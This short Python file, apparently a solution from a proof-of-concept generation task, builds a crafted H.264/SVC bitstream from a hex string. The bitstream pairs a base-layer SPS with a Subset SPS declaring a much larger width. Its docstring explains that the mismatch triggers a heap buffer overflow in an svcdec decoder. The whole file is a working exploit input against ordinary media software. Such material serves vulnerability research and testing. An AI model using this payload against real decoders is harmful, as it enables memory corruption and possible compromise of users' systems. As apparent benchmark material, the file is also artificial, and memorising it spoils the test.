import base64

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The PoC is a minimal H.264/SVC bitstream designed to cause a heap
        buffer overflow in the svcdec decoder. The vulnerability is triggered
        when the display dimensions defined in a base layer Sequence Parameter
        Set (SPS) are smaller than the dimensions defined in an enhancement
        layer's Subset SPS.

        The crafted bitstream consists of four NAL units:
        1. A base layer SPS (NAL unit type 7) that specifies standard dimensions.
        2. A Subset SPS (NAL unit type 15) that specifies a much larger width.
           This mismatch is the root cause of the vulnerability.
        3. A Picture Parameter Set (PPS, NAL unit type 8) to link the SPSs.
        4. An IDR Slice (NAL unit type 5) to trigger the decoding process,
           which leads to memory allocation based on the small dimensions and
           memory access based on the large dimensions, causing an overflow.

        The PoC is constructed as a hex string and converted to bytes.
        The src_path argument is not used as the PoC is static.
        """
        
        # The PoC is constructed from a hex string representation of the H.264/SVC bitstream.
        # This string concatenates the four necessary NAL units, each preceded by a start code (00000001).
        poc_hex_str = (
            "00000001"  # Start Code
            "6753c01eda010c1d0800000300200000078440"  # NAL Unit: SPS (small dimensions)
            "00000001"  # Start Code
            "6f53c01eda010c1d08800001f400005dc404"  # NAL Unit: Subset SPS (large width)
            "00000001"  # Start Code
            "68ce3c80"  # NAL Unit: PPS
            "00000001"  # Start Code
            "658882077ff87ffc10"  # NAL Unit: IDR Slice (triggers decoding)
        )
        
        poc_bytes = bytes.fromhex(poc_hex_str)
        
        return poc_bytes